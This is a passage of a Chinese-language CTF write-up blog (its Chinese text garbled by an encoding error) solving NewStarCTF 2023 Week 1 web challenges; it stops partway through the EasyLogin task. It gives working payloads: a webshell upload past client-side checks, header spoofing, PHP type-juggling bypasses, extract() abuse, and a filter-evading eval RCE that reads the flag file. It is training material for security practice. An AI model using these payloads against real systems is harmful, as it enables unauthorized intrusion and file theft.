<!doctype html><html lang=zh><head><meta charset=utf-8><meta content="width=device-width,initial-scale=1.0" name=viewport><meta content="light dark" name=color-scheme><title>NewStarCTF wp</title><link href=/img/favicon-32x32.png rel=icon sizes=32x32 type=image/png><link href=/img/favicon-16x16.png rel=icon sizes=16x16 type=image/png><link href=/img/apple-touch-icon.png rel=apple-touch-icon sizes=180x180><style>body{--primary-color:#5871a2;--primary-pale-color:#5871a210;--text-color:#3c4043;--text-pale-color:#a3a5a9;--bg-color:#fff;--highlight-mark-color:#5f75b035;--blockquote-color:#8e8d91;--callout-note-color:#5871a2;--callout-important-color:#8062b0;--callout-warning-color:#936e51;--callout-alert-color:#bc5252;--callout-question-color:#477389;--callout-tip-color:#3c8460}body.dark{--primary-color:#5d77ac;--primary-pale-color:#5d77ac20;--text-color:#9197a5;--text-pale-color:#656a74;--bg-color:#18191b;--highlight-mark-color:#5f75b035;--blockquote-color:#747983;--callout-note-color:#5d77ac;--callout-important-color:#8062b0;--callout-warning-color:#936e51;--callout-alert-color:#bc5252;--callout-question-color:#477389;--callout-tip-color:#3c8460}body{--main-font:ui-sans-serif,system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,"Noto Sans",sans-serif,"Apple Color Emoji","Segoe UI Emoji","Segoe UI Symbol","Noto Color Emoji";--code-font:ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,"Liberation Mono","Courier New",monospace;--homepage-max-width:768px;--main-max-width:768px;--avatar-size:56px;--homepage-font-size:16px;--homepage-line-height:1.75;--paragraph-font-size:16px;--paragraph-line-height:1.75;--aside-font-size:15px;--img-border-radius:0px;--detail-border-radius:0px;--dark-mode-img-brightness:.75;--dark-mode-chart-brightness:.75;--inline-code-border-radius:2px;--inline-code-bg-color:var(--primary-pale-color);--block-code-border-radius:0px;--block-code-border-color:var(--primary-color);--detail-border-color:var(--primary-color)}</style><link href=/main.css rel=stylesheet><link href=/hl-light.css id=hl rel=stylesheet><link crossorigin href=https://cdn.jsdelivr.net/npm/katex@0.16.11/dist/katex.min.css integrity=sha384-nB0miv6/jRmo5UMMR1wu3Gz6NLsoTkbqJghGIsx//Rlm+ZU03BU6SQNC66uf4l5+ rel=stylesheet><script crossorigin defer integrity=sha384-7zkQWkzuo3B5mTepMUcHkMB5jZaolc2xDwL6VFqjFALcbeS9Ggm/Yr2r3Dy4lfFg src=https://cdn.jsdelivr.net/npm/katex@0.16.11/dist/katex.min.js></script><script crossorigin defer integrity=sha384-43gviWU0YVjaDtb/GhzOouOXtZMP/7XUzwPTstBeZFe/+rCMvRwr4yROQP43s0Xk src=https://cdn.jsdelivr.net/npm/katex@0.16.11/dist/contrib/auto-render.min.js></script><script crossorigin defer integrity=sha384-HORx6nWi8j5/mYA+y57/9/CZc5z8HnEw4WUZWy5yOn9ToKBv1l58vJaufFAn9Zzi src=https://cdn.jsdelivr.net/npm/katex@0.16.11/dist/contrib/copy-tex.min.js></script><script>document.addEventListener(`DOMContentLoaded`,(()=>{let b=`\$`,a=`\$\$`;renderMathInElement(document.body,{delimiters:[{left:a,right:a,display:!0},{left:b,right:b,display:!1},{left:`\\\\(`,right:`\\\\)`,display:!1},{left:`\\\\[`,right:`\\\\]`,display:!0}],throwOnError:!1})}))</script><body class=post><script>const theme=sessionStorage.getItem(`theme`);const match=window.matchMedia(`(prefers-color-scheme: dark)`).matches;if(theme&&theme==`dark`||!theme&&match){document.body.classList.add(`dark`);const a=document.querySelector(`link#hl`);if(a)a.href=`/hl-dark.css`}</script><header class=blur><div id=header-wrapper><nav><a class=instant href=/>lbsucceed</a><button aria-label="toggle expand" class=separator id=toggler>::</button><span class="wrap left fold">{</span><a class=instant href=/posts>posts</a><span class="wrap-separator fold">,</span><a class="instant fold" href=/projects>projects</a><span class="wrap-separator fold">,</span><a class="instant fold" href=/about>about</a><span class="wrap right fold">} ;</span></nav><div id=btns><a aria-label="rss feed" href=/posts/feed.xml id=rss-btn><svg viewbox="0 0 24 24" height=20 width=20 xmlns=http://www.w3.org/2000/svg><path d="M3 17C5.20914 17 7 18.7909 7 21H3V17ZM3 10C9.07513 10 14 14.9249 14 21H12C12 16.0294 7.97056 12 3 12V10ZM3 3C12.9411 3 21 11.0589 21 21H19C19 12.1634 11.8366 5 3 5V3Z" fill=currentColor></path></svg></a><button aria-label="theme switch" id=theme-toggle><span class=moon-icon><svg viewbox="0 0 24 24" height=20 width=20 xmlns=http://www.w3.org/2000/svg><path d="M10 7C10 10.866 13.134 14 17 14C18.9584 14 20.729 13.1957 21.9995 11.8995C22 11.933 22 11.9665 22 12C22 17.5228 17.5228 22 12 22C6.47715 22 2 17.5228 2 12C2 6.47715 6.47715 2 12 2C12.0335 2 12.067 2 12.1005 2.00049C10.8043 3.27098 10 5.04157 10 7ZM4 12C4 16.4183 7.58172 20 12 20C15.0583 20 17.7158 18.2839 19.062 15.7621C18.3945 15.9187 17.7035 16 17 16C12.0294 16 8 11.9706 8 7C8 6.29648 8.08133 5.60547 8.2379 4.938C5.71611 6.28423 4 8.9417 4 12Z" fill=currentColor></path></svg></span> <span class=sun-icon><svg viewbox="0 0 24 24" height=20 width=20 xmlns=http://www.w3.org/2000/svg><path d="M12 18C8.68629 18 6 15.3137 6 12C6 8.68629 8.68629 6 12 6C15.3137 6 18 8.68629 18 12C18 15.3137 15.3137 18 12 18ZM12 16C14.2091 16 16 14.2091 16 12C16 9.79086 14.2091 8 12 8C9.79086 8 8 9.79086 8 12C8 14.2091 9.79086 16 12 16ZM11 1H13V4H11V1ZM11 20H13V23H11V20ZM3.51472 4.92893L4.92893 3.51472L7.05025 5.63604L5.63604 7.05025L3.51472 4.92893ZM16.9497 18.364L18.364 16.9497L20.4853 19.0711L19.0711 20.4853L16.9497 18.364ZM19.0711 3.51472L20.4853 4.92893L18.364 7.05025L16.9497 5.63604L19.0711 3.51472ZM5.63604 16.9497L7.05025 18.364L4.92893 20.4853L3.51472 19.0711L5.63604 16.9497ZM23 11V13H20V11H23ZM4 11V13H1V11H4Z" fill=currentColor></path></svg></span></button><button aria-label="table of content" id=toc-toggle><svg viewbox="0 0 24 24" height=20 width=20 xmlns=http://www.w3.org/2000/svg><path d="M3 4H21V6H3V4ZM3 11H15V13H3V11ZM3 18H21V20H3V18Z" fill=currentColor></path></svg></button></div></div></header><dialog id=rss-mask><div><a href=https://lbsucceed.github.io/posts/feed.xml>https://lbsucceed.github.io/posts/feed.xml</a><button data-check-icon='<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="20" height="20"><path d="M10.0007 15.1709L19.1931 5.97852L20.6073 7.39273L10.0007 17.9993L3.63672 11.6354L5.05093 10.2212L10.0007 15.1709Z" fill="currentColor"></path></svg>' data-copy-icon='<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="20" height="20"><path d="M6.9998 6V3C6.9998 2.44772 7.44752 2 7.9998 2H19.9998C20.5521 2 20.9998 2.44772 20.9998 3V17C20.9998 17.5523 20.5521 18 19.9998 18H16.9998V20.9991C16.9998 21.5519 16.5499 22 15.993 22H4.00666C3.45059 22 3 21.5554 3 20.9991L3.0026 7.00087C3.0027 6.44811 3.45264 6 4.00942 6H6.9998ZM5.00242 8L5.00019 20H14.9998V8H5.00242ZM8.9998 6H16.9998V16H18.9998V4H8.9998V6Z" fill="currentColor"></path></svg>' aria-label=copy autofocus data-link=https://lbsucceed.github.io/posts/feed.xml><svg viewbox="0 0 24 24" height=20 width=20 xmlns=http://www.w3.org/2000/svg><path d="M6.9998 6V3C6.9998 2.44772 7.44752 2 7.9998 2H19.9998C20.5521 2 20.9998 2.44772 20.9998 3V17C20.9998 17.5523 20.5521 18 19.9998 18H16.9998V20.9991C16.9998 21.5519 16.5499 22 15.993 22H4.00666C3.45059 22 3 21.5554 3 20.9991L3.0026 7.00087C3.0027 6.44811 3.45264 6 4.00942 6H6.9998ZM5.00242 8L5.00019 20H14.9998V8H5.00242ZM8.9998 6H16.9998V16H18.9998V4H8.9998V6Z" fill=currentColor></path></svg></button></div></dialog><div id=wrapper><div id=blank></div><aside><nav><ul><li><a class=h2 href=#newstarctf-2023>NewStarCTF 2023</a> <ul><li><a class=h3 href=#web>Web</a><li><a class=h3 href=#misc>Misc</a><li><a class=h3 href=#crypto>Crypto</a><li><a class=h3 href=#reverse>Reverse</a></ul></ul></nav><button aria-label="back to top" id=back-to-top><svg viewbox="0 0 24 24" height=24 width=24 xmlns=http://www.w3.org/2000/svg><path d="M11.9997 10.8284L7.04996 15.7782L5.63574 14.364L11.9997 8L18.3637 14.364L16.9495 15.7782L11.9997 10.8284Z" fill=currentColor></path></svg></button></aside><main><div><div data-check-icon='<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="20" height="20"><path d="M10.0007 15.1709L19.1931 5.97852L20.6073 7.39273L10.0007 17.9993L3.63672 11.6354L5.05093 10.2212L10.0007 15.1709Z" fill="currentColor"></path></svg>' data-copy-icon='<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="20" height="20"><path d="M6.9998 6V3C6.9998 2.44772 7.44752 2 7.9998 2H19.9998C20.5521 2 20.9998 2.44772 20.9998 3V17C20.9998 17.5523 20.5521 18 19.9998 18H16.9998V20.9991C16.9998 21.5519 16.5499 22 15.993 22H4.00666C3.45059 22 3 21.5554 3 20.9991L3.0026 7.00087C3.0027 6.44811 3.45264 6 4.00942 6H6.9998ZM5.00242 8L5.00019 20H14.9998V8H5.00242ZM8.9998 6H16.9998V16H18.9998V4H8.9998V6Z" fill="currentColor"></path></svg>' id=copy-cfg style=display:none></div><article data-backlink-icon='<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="20" height="20"><path d="M9.41421 8L18.0208 16.6066L16.6066 18.0208L8 9.41421V17H6V6H17V8H9.41421Z" fill="currentColor"></path></svg>' class=prose><h1>NewStarCTF wp</h1><div id=post-info><div id=date><span id=publish>2023-04-15</span><span>Updated on <span id=updated>2025-06-09</span></span></div><div id=tags><a class=instant href=https://lbsucceed.github.io/tags/engineer><span>#</span>engineer</a></div></div><blockquote class="callout alert hidden" data-alert-text-after=" days ago and may be out of date." data-alert-text-before="This article was last updated " data-days=120 id=outdate_alert><div class=content></div></blockquote><h1 id=newstarctf-2023>NewStarCTF 2023<a aria-label="Anchor link for: newstarctf-2023" class=zola-anchor href=#newstarctf-2023 style=visibility:hidden></a></h1><h2 id=web>Web<a aria-label="Anchor link for: web" class=zola-anchor href=#web style=visibility:hidden></a></h2><h3 id=week-1-xie-lou-de-mi-mi>[Week 1]æ³„æ¼çš„ç§˜å¯†<a aria-label="Anchor link for: week-1-xie-lou-de-mi-mi" class=zola-anchor href=#week-1-xie-lou-de-mi-mi style=visibility:hidden></a></h3><blockquote><p>æ³¨æ„ï¼Œæ­¤éƒ¨åˆ†å›¾åºŠå·²å</blockquote><p>é€šè¿‡ä½¿ç”¨ dirsearch æ‰«æå¯ä»¥å¾—åˆ°ä¸¤ä¸ªæ–‡ä»¶å¯è®¿é—® <code>robots.txt</code> å’Œ <code>www.zip</code> ã€‚<p>robots.txt å†…å®¹å¦‚ä¸‹<pre class=z-code><code><span class="z-text z-plain">PART ONE: flag{r0bots_1s_s0_us3ful
</span></code></pre><p>www.zip/index.php å†…å®¹å¦‚ä¸‹<pre class=z-code><code><span class="z-text z-plain">&LT?php
</span><span class="z-text z-plain">$PART_TWO = "_4nd_www.zip_1s_s0_d4ng3rous}";
</span><span class="z-text z-plain">echo "&LTh1>ç²—å¿ƒçš„ç®¡ç†å‘˜æ³„æ¼äº†ä¸€äº›æ•æ„Ÿä¿¡æ¯ï¼Œè¯·ä½ æ‰¾å‡ºä»–æ³„æ¼çš„ä¸¤ä¸ªæ•æ„Ÿä¿¡æ¯ï¼&LT/h1>";
</span></code></pre><p>å³å¯å¾—åˆ° flag å¦‚ä¸‹<pre class=z-code><code><span class="z-text z-plain">flag{r0bots_1s_s0_us3ful_4nd_www.zip_1s_s0_d4ng3rous}
</span></code></pre><h3 id=week-1-begin-of-upload>[Week 1]Begin of Upload<a aria-label="Anchor link for: week-1-begin-of-upload" class=zola-anchor href=#week-1-begin-of-upload style=visibility:hidden></a></h3><p>é€šè¿‡æŸ¥çœ‹æºä»£ç å¯ä»¥å‘ç°ä½¿ç”¨çš„æ˜¯å‰ç«¯è¿‡æ»¤ï¼Œé€šè¿‡åœ¨æµè§ˆå™¨ä¸­ç¦æ­¢ JavaScript åå³å¯ç›´æ¥ä¸Šä¼  shell æ–‡ä»¶ã€‚<p>é€šè¿‡èšå‰‘ä¸€æŠŠæ¢­å³å¯å¾—åˆ° flagï¼ˆæ–‡ä»¶åœ¨ /fllll4gï¼‰ã€‚<pre class=z-code><code><span class="z-text z-plain">flag{1b60e33c-182d-4a44-901a-549b43a7a66e}
</span></code></pre><h3 id=week-1-begin-of-http>[Week 1]Begin of HTTP<a aria-label="Anchor link for: week-1-begin-of-http" class=zola-anchor href=#week-1-begin-of-http style=visibility:hidden></a></h3><h4 id=0x00-get><strong>0x00 GET</strong><a aria-label="Anchor link for: 0x00-get" class=zola-anchor href=#0x00-get style=visibility:hidden></a></h4><pre class=z-code><code><span class="z-text z-plain">è¯·ä½¿ç”¨ GETæ–¹å¼ æ¥ç»™ ctf å‚æ•°ä¼ å…¥ä»»æ„å€¼æ¥é€šè¿‡è¿™å…³
</span></code></pre><p>é€šè¿‡ param ä¼ å…¥ ctf å‚æ•°å³å¯ï¼Œå¦‚ä¸‹<pre class=z-code><code><span class="z-text z-plain">http://node4.buuoj.cn:29844/?ctf=123
</span></code></pre><h4 id=0x01-post><strong>0x01 POST</strong><a aria-label="Anchor link for: 0x01-post" class=zola-anchor href=#0x01-post style=visibility:hidden></a></h4><pre class=z-code><code><span class="z-text z-plain">å¾ˆæ£’ï¼Œå¦‚æœæˆ‘è¿˜æƒ³è®©ä½ ä»¥POSTæ–¹å¼æ¥ç»™æˆ‘ä¼ é€’ secret å‚æ•°ä½ åˆè¯¥å¦‚ä½•å¤„ç†å‘¢ï¼Ÿ 
</span><span class="z-text z-plain">å¦‚æœä½ ä¼ å…¥çš„å‚æ•°å€¼å¹¶ä¸æ˜¯æˆ‘æƒ³è¦çš„secretï¼Œæˆ‘ä¹Ÿä¸ä¼šæ”¾ä½ è¿‡å…³çš„ æˆ–è®¸ä½ å¯ä»¥æ‰¾ä¸€æ‰¾æˆ‘æŠŠsecretè—åœ¨äº†å“ªé‡Œ
</span></code></pre><p>æŸ¥çœ‹æºä»£ç å¯ä»¥å‘ç°<pre class=z-code><code><span class="z-text z-plain">&LT!-- Secret: base64_decode(bjN3c3Q0ckNURjIwMjNnMDAwMDBk) -->
</span></code></pre><p>é€šè¿‡ base64 è§£å¯†å¯ä»¥å¾—åˆ° Secret å€¼ä¸º <code>n3wst4rCTF2023g00000d</code> ï¼Œé€šè¿‡ body ä¼ å…¥å³å¯ã€‚<pre class=z-code><code><span class="z-text z-plain">secret=n3wst4rCTF2023g00000d
</span></code></pre><h4 id=0x02-cookie><strong>0x02 Cookie</strong><a aria-label="Anchor link for: 0x02-cookie" class=zola-anchor href=#0x02-cookie style=visibility:hidden></a></h4><pre class=z-code><code><span class="z-text z-plain">å¾ˆå¼ºï¼Œç°åœ¨æˆ‘éœ€è¦éªŒè¯ä½ çš„ power æ˜¯å¦æ˜¯ ctfer ï¼Œåªæœ‰ctferå¯ä»¥é€šè¿‡è¿™å…³
</span></code></pre><p>é€šè¿‡è®¾ç½® Cookie å¦‚ä¸‹<pre class=z-code><code><span class="z-text z-plain">Cookie: power=ctfer
</span></code></pre><h4 id=0x03-user-agent><strong>0x03 User-Agent</strong><a aria-label="Anchor link for: 0x03-user-agent" class=zola-anchor href=#0x03-user-agent style=visibility:hidden></a></h4><pre class=z-code><code><span class="z-text z-plain">ä½ å·²ç»å®Œæˆäº†æœ¬é¢˜è¿‡åŠçš„å…³å¡ï¼Œç°åœ¨è¯·ä½¿ç”¨ NewStarCTF2023æµè§ˆå™¨ æ¥é€šè¿‡è¿™å…³ï¼
</span></code></pre><p>é€šè¿‡è®¾ç½® User-Agent å¦‚ä¸‹<pre class=z-code><code><span class="z-text z-plain">User-Agent: NewStarCTF2023
</span></code></pre><h4 id=0x04-referer><strong>0x04 Referer</strong><a aria-label="Anchor link for: 0x04-referer" class=zola-anchor href=#0x04-referer style=visibility:hidden></a></h4><pre class=z-code><code><span class="z-text z-plain">å¸Œæœ›ä½ æ˜¯ä» newstarctf.com è®¿é—®åˆ°è¿™ä¸ªå…³å¡çš„
</span></code></pre><p>é€šè¿‡è®¾ç½® Referer å¦‚ä¸‹<pre class=z-code><code><span class="z-text z-plain">Referer: newstarctf.com
</span></code></pre><h4 id=0x05-x-real-ip><strong>0x05 X-Real-Ip</strong><a aria-label="Anchor link for: 0x05-x-real-ip" class=zola-anchor href=#0x05-x-real-ip style=visibility:hidden></a></h4><pre class=z-code><code><span class="z-text z-plain">æœ€åä¸€å…³äº†ï¼åªæœ‰ æœ¬åœ°ç”¨æˆ· å¯ä»¥é€šè¿‡è¿™ä¸€å…³
</span></code></pre><p>é€šè¿‡è®¾ç½® X-Real-Ip å¦‚ä¸‹<pre class=z-code><code><span class="z-text z-plain">X-Real-Ip: 127.0.0.1
</span></code></pre><p>å°±å¯ä»¥å¾—åˆ° flag äº†ã€‚<h3 id=week-1-errorflask>[Week 1]ErrorFlask<a aria-label="Anchor link for: week-1-errorflask" class=zola-anchor href=#week-1-errorflask style=visibility:hidden></a></h3><p>é€šè¿‡é¢˜ç›®å¾—çŸ¥éœ€è¦ä» Flask ä¸­çš„æŠ¥é”™ä¸­å¯»æ‰¾ç­”æ¡ˆï¼Œç½‘é¡µå›æ˜¾å¦‚ä¸‹<pre class=z-code><code><span class="z-text z-plain">give me number1 and number2,i will help you to add
</span></code></pre><p>é€šè¿‡è¾“å…¥å­—ç¬¦ä¸²ç±»å‹çš„å€¼å³å¯å¾—åˆ°æŠ¥é”™ï¼ŒPayload å¦‚ä¸‹<pre class=z-code><code><span class="z-text z-plain">?number1=a&number2=b
</span></code></pre><p>å¾—åˆ°å›æ˜¾åç‚¹å‡» <code>return "not ssti,flag in source code~"+str(int(num1)+int(num2))</code> å³å¯å¾—åˆ° flag ï¼Œä¸æ–¹ä¾¿å¤åˆ¶å¯ä»¥ F12 æ¥å¤åˆ¶ã€‚<pre class=z-code><code><span class="z-text z-plain">flag = "flag{Y0u_@re_3enset1ve_4bout_deb8g}"
</span></code></pre><h3 id=week-1-begin-of-php>[Week 1]Begin of PHP<a aria-label="Anchor link for: week-1-begin-of-php" class=zola-anchor href=#week-1-begin-of-php style=visibility:hidden></a></h3><pre class=z-code><code><span class="z-text z-plain">&LT?php
</span><span class="z-text z-plain">error_reporting(0);
</span><span class="z-text z-plain">highlight_file(__FILE__);
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">if(isset($_GET['key1']) && isset($_GET['key2'])){
</span><span class="z-text z-plain">    echo "=Level 1=&LTbr>";
</span><span class="z-text z-plain">    if($_GET['key1'] !== $_GET['key2'] && md5($_GET['key1']) == md5($_GET['key2'])){
</span><span class="z-text z-plain">        $flag1 = True;
</span><span class="z-text z-plain">    }else{
</span><span class="z-text z-plain">        die("nope,this is level 1");
</span><span class="z-text z-plain">    }
</span><span class="z-text z-plain">}
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">if($flag1){
</span><span class="z-text z-plain">    echo "=Level 2=&LTbr>";
</span><span class="z-text z-plain">    if(isset($_POST['key3'])){
</span><span class="z-text z-plain">        if(md5($_POST['key3']) === sha1($_POST['key3'])){
</span><span class="z-text z-plain">            $flag2 = True;
</span><span class="z-text z-plain">        }
</span><span class="z-text z-plain">    }else{
</span><span class="z-text z-plain">        die("nope,this is level 2");
</span><span class="z-text z-plain">    }
</span><span class="z-text z-plain">}
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">if($flag2){
</span><span class="z-text z-plain">    echo "=Level 3=&LTbr>";
</span><span class="z-text z-plain">    if(isset($_GET['key4'])){
</span><span class="z-text z-plain">        if(strcmp($_GET['key4'],file_get_contents("/flag")) == 0){
</span><span class="z-text z-plain">            $flag3 = True;
</span><span class="z-text z-plain">        }else{
</span><span class="z-text z-plain">            die("nope,this is level 3");
</span><span class="z-text z-plain">        }
</span><span class="z-text z-plain">    }
</span><span class="z-text z-plain">}
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">if($flag3){
</span><span class="z-text z-plain">    echo "=Level 4=&LTbr>";
</span><span class="z-text z-plain">    if(isset($_GET['key5'])){
</span><span class="z-text z-plain">        if(!is_numeric($_GET['key5']) && $_GET['key5'] > 2023){
</span><span class="z-text z-plain">            $flag4 = True;
</span><span class="z-text z-plain">        }else{
</span><span class="z-text z-plain">            die("nope,this is level 4");
</span><span class="z-text z-plain">        }
</span><span class="z-text z-plain">    }
</span><span class="z-text z-plain">}
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">if($flag4){
</span><span class="z-text z-plain">    echo "=Level 5=&LTbr>";
</span><span class="z-text z-plain">    extract($_POST);
</span><span class="z-text z-plain">    foreach($_POST as $var){
</span><span class="z-text z-plain">        if(preg_match("/[a-zA-Z0-9]/",$var)){
</span><span class="z-text z-plain">            die("nope,this is level 5");
</span><span class="z-text z-plain">        }
</span><span class="z-text z-plain">    }
</span><span class="z-text z-plain">    if($flag5){
</span><span class="z-text z-plain">        echo file_get_contents("/flag");
</span><span class="z-text z-plain">    }else{
</span><span class="z-text z-plain">        die("nope,this is level 5");
</span><span class="z-text z-plain">    }
</span><span class="z-text z-plain">}
</span></code></pre><h4 id=0x00-level-1><strong>0x00 Level 1</strong><a aria-label="Anchor link for: 0x00-level-1" class=zola-anchor href=#0x00-level-1 style=visibility:hidden></a></h4><p>md5 ç»•è¿‡ï¼Œå¯ä»¥é€šè¿‡æ•°ç»„è¿›è¡Œç»•è¿‡ï¼ŒPayload å¦‚ä¸‹<pre class=z-code><code><span class="z-text z-plain">key1[]=1&key2[]=2
</span></code></pre><h4 id=0x01-level-2><strong>0x01 Level 2</strong><a aria-label="Anchor link for: 0x01-level-2" class=zola-anchor href=#0x01-level-2 style=visibility:hidden></a></h4><p>md5 === sha1 ç»•è¿‡ï¼ŒåŒæ ·å¯ä»¥é€šè¿‡æ•°ç»„è¿›è¡Œç»•è¿‡ï¼ŒPayload å¦‚ä¸‹ï¼ˆLevel 5 ä¸­ä¸å…è®¸ POST çš„å€¼å‡ºç°ä»»ä½•æ•°å­—æˆ–å­—æ¯ï¼‰<pre class=z-code><code><span class="z-text z-plain">key3[]=@
</span></code></pre><h4 id=0x02-level-3><strong>0x02 Level 3</strong><a aria-label="Anchor link for: 0x02-level-3" class=zola-anchor href=#0x02-level-3 style=visibility:hidden></a></h4><p>strcmp å‡½æ•°ç»•è¿‡ï¼ŒåŒæ ·å¯ä»¥é€šè¿‡æ•°ç»„è¿›è¡Œç»•è¿‡ï¼ŒPayload å¦‚ä¸‹<pre class=z-code><code><span class="z-text z-plain">key1[]=1&key2[]=2&key4[]=4
</span></code></pre><h4 id=0x03-level-4><strong>0x03 Level 4</strong><a aria-label="Anchor link for: 0x03-level-4" class=zola-anchor href=#0x03-level-4 style=visibility:hidden></a></h4><p>is_numeric å‡½æ•°ç»•è¿‡ï¼Œå°† key5 è®¾ç½®ä¸º 2024a(ä»»æ„å­—ç¬¦) å³å¯ï¼ŒPayload å¦‚ä¸‹<pre class=z-code><code><span class="z-text z-plain">key1[]=1&key2[]=2&key4[]=4&key5=2024a
</span></code></pre><h4 id=0x04-level-5><strong>0x04 Level 5</strong><a aria-label="Anchor link for: 0x04-level-5" class=zola-anchor href=#0x04-level-5 style=visibility:hidden></a></h4><p><code>extract($_POST);</code> å‡½æ•°ç›¸å½“äº <code>$name = $_POST['name']</code> ã€‚<p>é€šè¿‡å‘ç°ç¼ºå°‘äº† flag5 å˜é‡ï¼Œè¯´æ˜å°±éœ€è¦é€šè¿‡ä»¥ä¸Šæ–¹æ³•æ¥é€ å‡º flag5ï¼Œåˆå› ä¸º POST çš„å€¼å‡ºç°ä»»ä½•æ•°å­—æˆ–å­—æ¯ï¼Œæ ¹æ®åœ¨ PHP ä¸­ï¼Œåªè¦å­—ç¬¦ä¸²ä¸ä¸ºç©ºå³ä¸º <code>True</code> çš„ç‰¹æ€§ï¼Œæ•… Payload å¦‚ä¸‹<pre class=z-code><code><span class="z-text z-plain">key3[]=@&flag5=@
</span></code></pre><p>å³å¯å¾—åˆ° flagã€‚<h3 id=week-1-r-c-e>[Week 1]R!C!E!<a aria-label="Anchor link for: week-1-r-c-e" class=zola-anchor href=#week-1-r-c-e style=visibility:hidden></a></h3><pre class=z-code><code><span class="z-text z-plain">&LT?php
</span><span class="z-text z-plain">highlight_file(__FILE__);
</span><span class="z-text z-plain">if(isset($_POST['password'])&&isset($_POST['e_v.a.l'])){
</span><span class="z-text z-plain">    $password=md5($_POST['password']);
</span><span class="z-text z-plain">    $code=$_POST['e_v.a.l'];
</span><span class="z-text z-plain">    if(substr($password,0,6)==="c4d038"){
</span><span class="z-text z-plain">        if(!preg_match("/flag|system|pass|cat|ls/i",$code)){
</span><span class="z-text z-plain">            eval($code);
</span><span class="z-text z-plain">        }
</span><span class="z-text z-plain">    }
</span><span class="z-text z-plain">}
</span></code></pre><p>æœ¬é¢˜éœ€è¦çŸ¥é“ GET æˆ– POST å˜é‡åä¸­çš„éæ³•å­—ç¬¦ä¼šè½¬åŒ–ä¸‹åˆ’çº¿ï¼Œå³ <code>$_POST['e_v.a.l']</code> éœ€è¦é€šè¿‡ <code>e[.v.a.l</code> æ¥ä¼ å…¥ã€‚<p>å¹¶ä¸”é¢˜ç›®ä¸­è¿˜å­˜åœ¨ä¸€ä¸ª passwordï¼Œè¯¥å‚æ•°ä¼šè¿›è¡Œ md5 åŠ å¯†å¹¶å¯¹æ¯”å‰ 6 ä½éœ€è¦ä¸ <code>c4d038</code> ä¸€è‡´ï¼Œå¯ä»¥é€šè¿‡å†™è„šæœ¬è¿›è¡Œçˆ†ç ´ã€‚<pre class=z-code><code><span class="z-text z-plain">import hashlib
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">for i in range(0, 99999999):
</span><span class="z-text z-plain">    if hashlib.md5(str(i).encode(encoding='utf-8')).hexdigest()[:6] == "c4d038":
</span><span class="z-text z-plain">        print(i)
</span><span class="z-text z-plain">        break
</span><span class="z-text z-plain">        
</span><span class="z-text z-plain"># 114514
</span></code></pre><p>é¢˜ç›®è¿˜å¯¹éƒ¨åˆ†å¸¸è§çš„æ¶æ„å‡½æ•°è¿›è¡Œäº†è¿‡æ»¤ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡ åå¼•å· æ¥æ‰§è¡Œ shell å‘½ä»¤ï¼Œä¹Ÿå¯ä»¥é€šè¿‡ åæ–œæ  æ¥è¿›è¡Œç»•è¿‡ï¼ŒPayload å¦‚ä¸‹<pre class=z-code><code><span class="z-text z-plain">password=114514&e[v.a.l=echo `l\s /`;
</span></code></pre><p>å¯ä»¥å¾—åˆ°å›æ˜¾å¦‚ä¸‹<pre class=z-code><code><span class="z-text z-plain">bin boot dev etc flag home lib lib64 media mnt opt proc root run sbin srv start.sh sys tmp usr var
</span></code></pre><p>æ„é€  Payload å¦‚ä¸‹å³å¯å¾—åˆ° flag<pre class=z-code><code><span class="z-text z-plain">password=114514&e[v.a.l=echo `tac /fl\ag`;
</span></code></pre><h3 id=week-1-easylogin>[Week 1]EasyLogin<a aria-label="Anchor link for: week-1-easylogin" class=zola-anchor href=#week-1-easylogin style=visibility:hidden></a></h3><p>éšæ„æ³¨å†Œä¸€ä¸ªè´¦å·åç™»å½•ä¼šè¿›å…¥ç»ˆç«¯ï¼Œä½†åœ¨ BurpSuite ä¸­å¯ä»¥å‘ç°è¿˜æœ‰ä¸€ä¸ªç‰¹åˆ«çš„è¯·æ±‚å¦‚ä¸‹<pre class=z-code><code><span class="z-text z-plain">POST /passport/f9e41a08a6eb869b894f509c4108adcf2213667fe2059d896886c5943156c7bc.php
</span></code></pre><p>è¯¥è¯·æ±‚çš„å›æ˜¾å¦‚ä¸‹<pre class=z-code><code><span class="z-text z-plain">&LT!-- æ­å–œä½ æ‰¾åˆ°flag -->
</span><span class="z-text z-plain">&LT!-- flag ä¸ºä¸‹æ–¹é“¾æ¥ä¸­è§†é¢‘ç®€ä»‹ç¬¬7è¡Œå¼€å§‹è‡³ç¬¬10è¡Œçš„å…¨éƒ¨å°å†™å­—æ¯å’Œæ•°å­— -->
</span><span class="z-text z-plain">&LT!-- https://b23.tv/BV1SD4y1J7uY -->
</span><span class="z-text z-plain">&LT!-- åº†ç¥ä¸€ä¸‹å§ï¼ -->
